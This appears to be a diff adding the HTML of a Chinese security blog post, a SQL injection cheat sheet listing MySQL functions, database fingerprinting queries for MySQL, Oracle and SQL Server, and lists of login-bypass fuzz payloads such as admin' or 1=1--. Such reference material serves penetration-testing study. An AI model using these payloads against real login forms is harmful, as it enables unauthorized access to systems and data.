@@ -1,0 +1,644 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>sql注入常用知识 | Yaoa</title>
+  <meta name="author" content="yaoa">
+  
+  <meta name="description" content="常用函数
+
+
+函数名
+作用
+备注
+
+
+
+version()
+数据库版本
+
+
+
+user()
+数据库用户名
+
+
+
+database()
+数据库名
+
+
+
+limit 0,1
+返回数据的条数
+第一个参数为起始行，第二个参数为返回的行数
+
+
+substr(str,1,1)
+截取字符串
+第二个参数为起始位置，从1开始，第二个为截取的数量
+
+
+mid(str,1,1)
+同substr()
+
+
+
+left(str,n)
+返回字符串的前n个字符
+
+
+
+right(str,n)
+返回字符串的后n个字符
+
+
+
+count(exp)
+结果数量
+
+
+
+load_file()
+导入文件
+
+
+
+hex()
+转换为16进制
+
+
+
+concat(str1,str2…)
+合并多个字符串，没有分隔符
+
+
+
+concat_ws(x,str1,str2..)
+同concat(),第一个参数为分隔符
+
+
+
+group_concat()
+连接一个组的字符串，用组分割
+
+
+
+ascii(str)
+返回字符串第一个字符的ascii码
+
+
+
+ord(str)
+同ascii()
+
+
+
+desc table_name
+展示表中的字段名和数据类型
+
+
+
+strcmp(expr1,expr2)
+字符串比较，一样返回0，第一个小于第二个返回-1,第一个大于第二个返回1
+
+
+
+RPAD(str,len,padstr)
+在str右方补齐len位的padstr，如果len小于str，返回len长度的str
+
+
+
+LPAD(str,len,padstr)
+类似RPAD(),左补齐
+
+
+
+INSERT(str,pos,len,newstr)
+在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。
+
+
+
+LENGTH(str)
+返回字符串的长度
+
+
+
+PI()
+返回π的具体数值
+
+
+
+REGEXP “statement”
+正则匹配，返回布尔值
+
+
+
+LIKE “statement”
+匹配数据，%代表任意内容，返回布尔值
+
+
+
+RLIKE “statement”
+与regexp相同
+
+
+
+LOWER(str)
+转换为小写，同LCASE(str)
+
+
+
+UPPER(str)
+转换为大写,同UCASE(str)
+
+
+
+NULLIF(expr1,expr2)
+如果相同，返回expr1，否则返回null
+
+
+
+CHARSET(str)
+返回字符串使用的字符集
+
+
+
+环境变量|变量名|作用||—|—|—||@@datadir|数据库路径||versiomn_compile_os|操作系统版本|
+常用fuzz登录 ‘ or ‘’-‘“ or “”-““ or true–‘ or true–admin’ –admin’ #admin’/*admin’ or ‘1’=’1admin’ or ‘1’=’1’–admin’ or ‘1’=’1’#admin’or 1=1 or ‘’=’admin’ or 1=1admin’ or 1=1–admin’ or 1=1#admin’ or 1=1/*
+测试‘-‘‘ ‘‘&amp;amp;’‘^’‘‘‘ or ‘’-‘‘ or ‘’ ‘‘ or ‘’&amp;amp;’‘ or ‘’^’‘ or ‘’‘“-““ ““&amp;amp;”“^”“““ or “”-““ or “” ““ or “”&amp;amp;”“ or “”^”“ or “”“or true–“ or true–‘ or true–“) or true–‘) or true–
+常用数据库"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="sql注入常用知识"/>
+  <meta property="og:site_name" content="Yaoa"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Yaoa</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>归档
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>分类
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>标签
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>关于我
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> sql注入常用知识</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>作用</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>version()</td>
+<td>数据库版本</td>
+<td></td>
+</tr>
+<tr>
+<td>user()</td>
+<td>数据库用户名</td>
+<td></td>
+</tr>
+<tr>
+<td>database()</td>
+<td>数据库名</td>
+<td></td>
+</tr>
+<tr>
+<td>limit 0,1</td>
+<td>返回数据的条数</td>
+<td>第一个参数为起始行，第二个参数为返回的行数</td>
+</tr>
+<tr>
+<td>substr(str,1,1)</td>
+<td>截取字符串</td>
+<td>第二个参数为起始位置，从1开始，第二个为截取的数量</td>
+</tr>
+<tr>
+<td>mid(str,1,1)</td>
+<td>同substr()</td>
+<td></td>
+</tr>
+<tr>
+<td>left(str,n)</td>
+<td>返回字符串的前n个字符</td>
+<td></td>
+</tr>
+<tr>
+<td>right(str,n)</td>
+<td>返回字符串的后n个字符</td>
+<td></td>
+</tr>
+<tr>
+<td>count(exp)</td>
+<td>结果数量</td>
+<td></td>
+</tr>
+<tr>
+<td>load_file()</td>
+<td>导入文件</td>
+<td></td>
+</tr>
+<tr>
+<td>hex()</td>
+<td>转换为16进制</td>
+<td></td>
+</tr>
+<tr>
+<td>concat(str1,str2…)</td>
+<td>合并多个字符串，没有分隔符</td>
+<td></td>
+</tr>
+<tr>
+<td>concat_ws(x,str1,str2..)</td>
+<td>同concat(),第一个参数为分隔符</td>
+<td></td>
+</tr>
+<tr>
+<td>group_concat()</td>
+<td>连接一个组的字符串，用组分割</td>
+<td></td>
+</tr>
+<tr>
+<td>ascii(str)</td>
+<td>返回字符串第一个字符的ascii码</td>
+<td></td>
+</tr>
+<tr>
+<td>ord(str)</td>
+<td>同ascii()</td>
+<td></td>
+</tr>
+<tr>
+<td>desc table_name</td>
+<td>展示表中的字段名和数据类型</td>
+<td></td>
+</tr>
+<tr>
+<td>strcmp(expr1,expr2)</td>
+<td>字符串比较，一样返回0，第一个小于第二个返回-1,第一个大于第二个返回1</td>
+<td></td>
+</tr>
+<tr>
+<td>RPAD(str,len,padstr)</td>
+<td>在str右方补齐len位的padstr，如果len小于str，返回len长度的str</td>
+<td></td>
+</tr>
+<tr>
+<td>LPAD(str,len,padstr)</td>
+<td>类似RPAD(),左补齐</td>
+<td></td>
+</tr>
+<tr>
+<td>INSERT(str,pos,len,newstr)</td>
+<td>在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。</td>
+<td></td>
+</tr>
+<tr>
+<td>LENGTH(str)</td>
+<td>返回字符串的长度</td>
+<td></td>
+</tr>
+<tr>
+<td>PI()</td>
+<td>返回π的具体数值</td>
+<td></td>
+</tr>
+<tr>
+<td>REGEXP “statement”</td>
+<td>正则匹配，返回布尔值</td>
+<td></td>
+</tr>
+<tr>
+<td>LIKE “statement”</td>
+<td>匹配数据，%代表任意内容，返回布尔值</td>
+<td></td>
+</tr>
+<tr>
+<td>RLIKE “statement”</td>
+<td>与regexp相同</td>
+<td></td>
+</tr>
+<tr>
+<td>LOWER(str)</td>
+<td>转换为小写，同LCASE(str)</td>
+<td></td>
+</tr>
+<tr>
+<td>UPPER(str)</td>
+<td>转换为大写,同UCASE(str)</td>
+<td></td>
+</tr>
+<tr>
+<td>NULLIF(expr1,expr2)</td>
+<td>如果相同，返回expr1，否则返回null</td>
+<td></td>
+</tr>
+<tr>
+<td>CHARSET(str)</td>
+<td>返回字符串使用的字符集</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p>|变量名|作用|<br>|—|—|—|<br>|@@datadir|数据库路径|<br>|versiomn_compile_os|操作系统版本|</p>
+<h2 id="常用fuzz"><a href="#常用fuzz" class="headerlink" title="常用fuzz"></a>常用fuzz</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p> ‘ or ‘’-‘<br>“ or “”-“<br>“ or true–<br>‘ or true–<br>admin’ –<br>admin’ #<br>admin’/*<br>admin’ or ‘1’=’1<br>admin’ or ‘1’=’1’–<br>admin’ or ‘1’=’1’#<br>admin’or 1=1 or ‘’=’<br>admin’ or 1=1<br>admin’ or 1=1–<br>admin’ or 1=1#<br>admin’ or 1=1/*</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>‘-‘<br>‘ ‘<br>‘&amp;’<br>‘^’<br>‘<em>‘<br>‘ or ‘’-‘<br>‘ or ‘’ ‘<br>‘ or ‘’&amp;’<br>‘ or ‘’^’<br>‘ or ‘’</em>‘<br>“-“<br>“ “<br>“&amp;”<br>“^”<br>“<em>“<br>“ or “”-“<br>“ or “” “<br>“ or “”&amp;”<br>“ or “”^”<br>“ or “”</em>“<br>or true–<br>“ or true–<br>‘ or true–<br>“) or true–<br>‘) or true–</p>
+<h2 id="常用数据库"><a href="#常用数据库" class="headerlink" title="常用数据库"></a>常用数据库</h2><p>在5.0版本后，mysql数据库中默认有一个information_schema数据库，其中有三个表，<br>SCHEMATA，TABLES，COLUMNS。<br>COLUMNS表中存放用户创建的所有库名，表名，字段名。<br>分别为TABLE_SCHEMA，TABLE_NAME，COLUMN_NAME.</p>
+<h2 id="数据库检测"><a href="#数据库检测" class="headerlink" title="数据库检测"></a>数据库检测</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><pre><code>sleep sleep(1)
+benchmark BENCHMARK(5000000, MD5(&#39;test&#39;))
+字符串连接
+SELECT &#39;a&#39; &#39;b&#39;
+SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)
+
+version
+    SELECT @@version
+    SELECT version()</code></pre>
+<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><pre><code>字符串连接
+    &#39;a&#39;||&#39;oracle&#39; --
+    SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)
+version
+    SELECT banner FROM v$version
+    SELECT banner FROM v$version WHERE rownum=1</code></pre>
+<h3 id="SQLServer"><a href="#SQLServer" class="headerlink" title="SQLServer"></a>SQLServer</h3><pre><code>WAITFOR WAITFOR DELAY &#39;00:00:10&#39;;
+SERVERNAME SELECT @@SERVERNAME
+version SELECT @@version
+
+字符串连接
+    SELECT &#39;some&#39;+&#39;string&#39;
+常量
+    @@pack_received
+    @@rowcount</code></pre>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2020/12/23/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/" class="leancloud-visitors view" data-flag-title="sql注入常用知识">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2020/12/23/sql注入手法/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+    <div class="ds-thread" data-thread-key="2020/12/23/sql注入常用知识/" data-title="sql注入常用知识"
+         data-url="http://yaoa.cool/2020/12/23/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/"></div>
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-12-23 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web/">web<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/web/">web<span>3</span></a></li> <li><a href="/tags/渗透/">渗透<span>3</span></a></li> <li><a href="/tags/sql注入/">sql注入<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-article-text">常用函数</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-article-text">环境变量</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B8%B8%E7%94%A8fuzz"><span class="toc-article-text">常用fuzz</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%99%BB%E5%BD%95"><span class="toc-article-text">登录</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-article-text">测试</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-article-text">常用数据库</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A3%80%E6%B5%8B"><span class="toc-article-text">数据库检测</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MySQL"><span class="toc-article-text">MySQL</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Oracle"><span class="toc-article-text">Oracle</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SQLServer"><span class="toc-article-text">SQLServer</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+<script type="text/javascript">
+  var duoshuoQuery = { short_name: '123' };
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';
+    ds.async = true;
+    ds.src = 'http://static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2020 yaoa's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
